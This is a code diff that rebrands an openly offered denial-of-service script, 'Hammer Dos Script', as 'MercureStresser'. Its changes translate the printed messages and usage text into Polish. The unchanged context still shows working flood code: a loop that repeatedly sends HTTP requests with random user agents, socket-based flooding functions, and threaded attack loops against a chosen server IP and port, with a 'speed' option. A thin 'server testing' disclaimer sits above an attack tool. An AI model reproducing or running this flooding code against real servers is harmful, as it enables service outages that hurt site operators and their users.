@@ -35,7 +35,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mbot is hammering...\033[0m")
+			print("\033[94mMercureStresser • Trwa ładowanie ataku... \033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -55,7 +55,7 @@ def down_it(item):
 				print("\033[91mshut<->down\033[0m")
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[91mno connection! server maybe down\033[0m")
+		print("\033[91mMercureStresser • Brak połączenia, poczekaj\033[0m")
 		#print("\033[91m",e,"\033[0m")
 		time.sleep(.1)
 
@@ -78,11 +78,11 @@ def usage():
 	print (''' \033[92m	Hammer Dos Script v.1 http://www.canyalcin.com/
 	It is the end user's responsibility to obey all applicable laws.
 	It is just for server testing script. Your ip is visible. \n
-	usage : python3 hammer.py [-s] [-p] [-t]
-	-h : help
+	MercureStresser • Poprawne użycie : python3 stresser.py [-s] ip [-p] port [-t] szybkosc
+	-h : pomoc
 	-s : server ip
-	-p : port default 80
-	-t : turbo default 135 \033[0m''')
+	-p : port 
+	-t : szybkość (100 Best) \033[0m''')
 	sys.exit()
 
 
@@ -139,7 +139,7 @@ if __name__ == '__main__':
 		s.connect((host,int(port)))
 		s.settimeout(1)
 	except socket.error as e:
-		print("\033[91mcheck server ip and port\033[0m")
+		print("\033[91mMercureStresser • Zle IP lub port\033[0m")
 		usage()
 	while True:
 		for i in range(int(thr)):
